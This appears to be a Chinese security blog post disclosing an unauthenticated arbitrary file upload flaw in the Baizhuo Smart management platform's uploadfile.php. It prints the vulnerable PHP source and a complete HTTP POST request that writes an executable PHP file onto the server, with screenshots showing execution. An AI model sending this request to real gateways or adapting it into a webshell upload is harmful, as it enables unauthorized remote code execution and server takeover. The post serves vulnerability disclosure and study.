---
title: "百卓Smart管理平台 uploadfile.php 文件上传漏洞"
source: https://mrxn.net/jswz/baizhuosmart-uploadfile-rce.html
asset_dir: assets/百卓smart管理平台-uploadfile.php-文件上传漏洞
---

# 百卓Smart管理平台 uploadfile.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/19 18:43
* 1259浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

身份验证

服务器

计算机安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。  
百卓Smart管理平台 `uploadfile.php` 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "任意文件上传")漏洞。未经身份验证的攻击者可以利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")上传恶意后门文件，执行任意指令，从而获得服务器权限并操纵服务器文件。

# 漏洞分析

Tool/uploadfile.php 文件业务逻辑实现如下：

```
<?php
if(isset($_POST['txt_path']))
{
    if(!isset($_FILES['file_upload']) || !isset($_POST['txt_path']))
    {
        exit("上传的文件和绝对路径不能为空！<a href=uploadfile.php>后退</a>");
    }
    else
    {

        $upload_file = $_FILES['file_upload']['tmp_name'];

        $post_path = $_POST['txt_path'];

        if(!copy($upload_file,$post_path))
        {

            exit("上传失败,可能是没有写入的权限!");
        }
        echo "上传成功!<a href=uploadfile.php>后退</a>";
    }
}
?>
<html>
<head></head>
<body>
<form name=frm enctype="multipart/form-data" action="?" method="POST">
<div align="center">上传文件:<input type="file" name="file_upload" size="26"></div>
<br>
<div align="center">绝对路径:<input type="text" id="txt_path" name="txt_path" size="28">(写全文件名)
&nbsp;&nbsp;<input type="submit" value="确定">
</div>
<br>
</form>
</body>
</html>
```

深入探索

代码安全审计

网页浏览器

软件

从 POST请求获取 `txt_path` 的值作为文件储存路径（需要一个可写权限的目录），上传里的filename随意，上传文件name部分为 `file_upload` 即可实现任意文件上传致RCE效果。

# 漏洞复现

```
POST /Tool/uploadfile.php HTTP/1.1
Host: smart.mrxn.net
Content-Type: multipart/form-data; boundary=----123456

------123456
Content-Disposition: form-data; name="txt_path"

/home/test.php
------123456
Content-Disposition: form-data; name="file_upload"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------123456--
```

深入探索

编码转换工具

安全工具开发

漏洞扫描服务

[![百卓Smart管理平台 uploadfile.php 文件上传漏洞](images/img-001-6db68ff2583d.webp)](https://image.mrxn.net/a9f0669c38624074810e3e53f619ce51.webp)

文件上传路径: `/home/test.php`

访问[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "上传文件"),成功执行代码

[![百卓Smart管理平台 uploadfile.php 文件上传漏洞](images/img-002-51aaa8f8eb4e.webp)](https://image.mrxn.net/8796782214c14dccb5732831e193a2bb.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.漏洞分析](#toc-2-)
* [3.漏洞复现](#toc-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[百卓Smart管理平台 uploadfile.php 文件上传漏洞](https://mrxn.net/jswz/baizhuosmart-uploadfile-rce.html)  
文章链接：<https://mrxn.net/jswz/baizhuosmart-uploadfile-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKVElEQVR4Aeyci3oiuQ6E8+/7v/MeqpWyRVttmgyhOTvOh1JyqSQbywaSufzz9fX175/av99fZ+t8yx+C61XCMzFp9rni9rbX7MfW7/k8tuZPUQ251ViPT9mB1pBbt7+eseoJOH8Wk6aKV5y0srMx4Au4kwN3nOrtLSfAvV4x6+WfMevPYq7ZGpLJ5V+3A0NDIE4I1DhbKkROdTJyHoQOnsOqRubs5/nNQczlsRCCg47OVXxmEDlnNBBauMcqd2hIJVrc+3ZgNeR9e31qppc2ZHbdoV/Xmc4x4aln8ECkOtkeyLcPANDXCrQUoMUb+WLnpQ158dr+ynIvbQj0EwThV7sKY8ynOOvNGSHygCYDhlMLx1xLTI7rCxPdXIh6jfhF56UNaetczo93YDXkx1v3O4lDQ3RtZzZbRpVnfRXLnHVnMefu/VwD4uXGGogxkGWDb/0jHBIT8ZPcoSGp3nIv2IHWEKC9OcJjv1orRF6OwWu5XFs+RH1Aw8F8SoHt+XksHMQHBERuDsPIOQ4Rg3PoPGFriAbLrt+B1ZDre3C3gn90df/U7iruBq4N/fqay9KKy3H51ggh6sm3SSPzWKixTL4MIg8QfcqUJwO2lz2g/VGFCyj+Cls3xDv6Ifh0Q6CfEgjfz8UnxOMjhPs86SA46Oh6EJx0e4OIAS0EtJMM4TvomhkhNNBPPnSuyjVnhFEPz3NPN8QLuAD/iin/gd5FqP28E/lk2YfIsw5iDB0dEzpP/swg8p/V55r7XIiaQJYNvvOEDgLt5pkzSmczV6E1Qsfl29YN8a58CK6GfEgjvIxTH3stFkK/thC++Gy+fkcIkQcdK61rQug8Flov31ZxjsFYA0bO+owQOtcXQnBZ96wPY411Q57dxV/Wtzf12TwQnQSaTKfE1shvBzh885OkyoOeA+FbZ4TgoaNjQghec9ggOMWPzFohhF6+zXkQMcCh8nkCG99ENwdG7kYPj3VDhi25llgNuXb/h9lbQ2C8UhCcr2xGiBj0n26H6jcCug7Cv9HDI9e2P4gSUWnMZXQKjHNDcJXeeRlnOoha0Pcj6+1X9aDntoZk4V/lf9iTHT725vW5q9A7COE7JnQOHMesEULo5NvgHPdTvfMyau2yzNmHWA/UaJ3yZR4Loc4BFJ7auiHT7Xl/cDXk/Xs+nbE1BNg+O0PHKlPXUwZdB+HP9DmmfFnm7EPUAky1dSlnb010cxwDhpxbeHtAj0H4W+D7m2t8DzcwVyFEjRzbkm7fMmf/Rg8Px4StIYNqEZfswLQhEN2vVqZuHlnWw1gDgqvyc+7Mh6gBI+Y8iLjnyjFzEBqghR0TNvKkoxwZ0G6qU6FzEL5jwmlDJFj23h1YDXnvfj+cbWiIrtrMIK4ZdHw4y01Q1bzRw6PSmcviistx+9ZBrNdj4V6TOQg9YNlpBLaXKtWznU0eGnI2cemmO/Dj4PTX7xCdztXd8Yw5Lh8iD/rvdaBz0shg5MTbIOL7MQQPvf5sPc4XQs/VWAadg/DF2yA4GLHSVBxErmMZIWLA17ohX5/11X6XVS3Lpy7HoHcT7n3rnCd8loNeU/kyCE7+3lz/LOb8Z3MqvetVscxVuopbNyTv2gf4qyEf0IS8hPam7usD8fIANTrZ+oyOZYS6DpBl28dEuH+TBjb+TviHA4iawLRSfl7Ato7M2YeI5WKOZQ5C55gQRm7dkLxrH+C3N3UYu1WtT52VQehhxFmecm1ZZw56Pccd81gIoZO/N+uFjsmXefwqVM29ufae1xhi3dBfDawXrhuiXfggWw35oGZoKdM3dV0xmYR7E39k0K+l86BzEL5jQhg514fHMUBlBgO2N+QhcCNgjHnOW3h4QOiBFgOG+hAcjOj6wlYkOeuGpM34BHf6pg7RYXXTBsFBx/0TsTZj1piHsYZjQoi4fBnEGGjlxNsamZx9zGNhkg0usJ18oMWUYwO2+H4MlPpGPnDWDXmwQe8Or4a8e8cfzHfqTR3Yrif0z86+qkLPAV0H9741QoiYcm3iZRAx6HOJl1krhK6D8KX5iamezfkeC81BzAOYmu4L0OItoXCg69YNKTboSmp4U3+0GOjdhHtfp0mWa2gsy1zlS7M3iPrWQ4wBU3cIbCfyjvweQMSgo+f7lmwAEd8G39+sy/gdav+BAEQe4FCLVXlNtHPWDdltyNXD4T0kdxPYTlzmZj6E/tGTco2sg8iFjtZBcB4LnSvfZg5CD5hqp7URyQG25wn9fQs6Zyl0znNCcNYIITgYUfGZXXBDZstZsdWQDzsDQ0OgXzOvFToHo2/dDH3FhXBcQ3EbhM51IcaAqRKdL7QA2F6WxNkcq9AaIYy5cM/lGso5sqyzn7VDQyxaeM0OTBuSOzfzf7r0quas1rP6XMu5ECcbOmZd5Ve55qz3WGgO+hww+pVu2hAnLHzfDqyGvG+vT800bQiM1wxGzjPpuso8PkJpZEdx89JkMy+EcR3WKm6D0HlszRFC6KGjczNCxDNnHyKW53DsEU4b8ih5xV+/A60hcK6ruev2X7EsiPnhHM7mhF5jv0boMQg/17I+Y44f+RC1gCYBto/aQOOyA2zxzLWGZPL/0f+vrHk15MM6OW1Ivrb2vX6I6waYamitsJHJAbarCh2l3VtK2dwc34jbt8xB1Ks4GGPWQcSAW8V4AMMaI3L/HULnWkIr5J8x64XThkiw7L070BriTkJ0HDrmJUHw1gshuKyzD8cx5dogdNDRNSrNjHNehXBcXzWdI/8Zg17Xea4lhIjLt8HItYZYtPDaHVgNuXb/h9mnDfHVg7haUP+J2l6XZ9nHgBYG2hunSeszQugyZ/0jzDl737kQ9QFTbV1Qc0CpUQG4j8F835RjmzbEooXv24H2t048ZT5Fz3LWZ4Q4LZnzHJk740PUAs7INw3w8CRvwsk3iBqVxM+lwkpfcTl33ZBqhxr3fqf9rROIUwDPo5ftTnuc0TGhefk2c9DnN2dNRghdxUHEoL92uxb0mLlH6DlmOpjXhYi7lrCqt25ItSsXcqshF25+NXVriK7QM1YVg7iW0NE6GDnHhNXcEDmKnzHXyFo4rmF9Rhj1MHJ5Dvm5hsbPGER9YP1fJ18f9tVuiNcFvVsw+tZV6FOSY+YyQtTNOhg551gHoQFMPcR9jZwA3H0kBnK4+c/WALa6rcDNmdVwTDg05Ja7HhfuwGrIhZtfTf0rDdHVs1WTVrGK2+daI3QM4uUBOjpWoXL3VukyB1E7c/saeWxdxTkmhKgLHX+lIZps2fEOzCK/0hDoHYfw8yLg55zr+PR5LDSXUfyRwbiOnGv/KF88RA3oKF4G5zjPI/yVhmgxy362A6shP9u3X8saGqJrM7MzK6nyoV9fx3Mtc3Csgx6D8HMN+xAxwFT7J23A9jMCjL94lBgiLn9vXqPQMflHZo0QxrrOg4gB6yf1rw/7ajcEepfgsT97HtDzrfNpEJrLCJGjuA2Cs858RscyVnG4r3Wkdy6EHuqb5HzoOrj3rRG6rvy9OSZsDdmL1viaHVgNuWbfD2f9HwAAAP//ROIqCQAAAAZJREFUAwCFjvd98gdhFgAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baizhuosmart-uploadfile-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baizhuosmart-uploadfile-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 